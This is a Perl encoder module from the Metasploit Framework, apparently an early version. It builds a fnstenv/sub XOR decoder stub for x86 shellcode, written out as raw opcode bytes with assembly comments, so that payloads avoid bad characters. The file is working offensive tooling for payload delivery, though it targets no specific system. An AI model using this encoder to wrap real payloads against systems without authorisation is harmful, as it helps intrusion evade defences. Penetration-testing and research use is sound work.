
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Encoder::PexFnstenvSub;
use strict;
use base 'Msf::Encoder::XorDword';
use Pex::Encoder;
my $advanced = {
};

my $info = {
  'Name'    => 'Pex Variable Length Fnstenv/sub Double Word Xor Encoder',
  'Version' => '$Revision$',
  'Authors' => [ 'spoonm <ninjatools [at] hush.com>', ],
  'Arch'    => [ 'x86' ],
  'OS'      => [ ],
  'Description'  =>  'Variable-length fnstenv/sub dword xor encoder',
  'Refs'  => [ ],
};

sub new {
  my $class = shift; 
  return($class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_));
}

# w00t http://archives.neohapsis.com/archives/vuln-dev/2003-q4/0096.html
# This is useful if you have a BadChar of say 0xff, and your payload is small (or insanely large)
# enough to not have 0xff in your payload, which is realistic (<= 512 && > 4)
sub _GenEncoder {
  my $self = shift;
  my $xor = shift;
  my $len = shift;
  my $xorkey = pack('V', $xor);
  my $l = Pex::Encoder::PackLength($len);

  # spoon's smaller variable-length fnstenv encoder
  my $decoder;
  if($l->{'negSmall'}) {
    # 24 bytes
    $decoder =
      "\xd9\xee".                         # fldz
      "\xd9\x74\x24\xf4".                 # fnstenv [esp - 12]
      "\x5b".                             # pop ebx
      "\x31\xc9".                         # xor ecx,ecx
      "\x83\xe9". $l->{'negLengthByte'} . # sub ecx, BYTE -xorlen
      "\x81\x73\x18". $xorkey .           # xor_xor: xor DWORD [ebx + 24], xorkey
      "\x83\xeb\xfc".                     # sub ebx,-4
      "\xe2\xf4"                          # loop xor_xor
  }
  else {
    # 27 bytes
    $decoder =
      "\xd9\xee".                         # fldz
      "\xd9\x74\x24\xf4".                 # fnstenv [esp - 12]
      "\x5b".                             # pop ebx
      "\x31\xc9".                         # xor ecx,ecx
      "\x81\xe9". $l->{'negLength'} .     # sub ecx, -xorlen
      "\x81\x73\x1b". $xorkey .           # xor_xor: xor DWORD [ebx + 27], xorkey
      "\x83\xeb\xfc".                     # sub ebx,-4
      "\xe2\xf4"                          # loop xor_xor
  }
  return($decoder);
}

1;
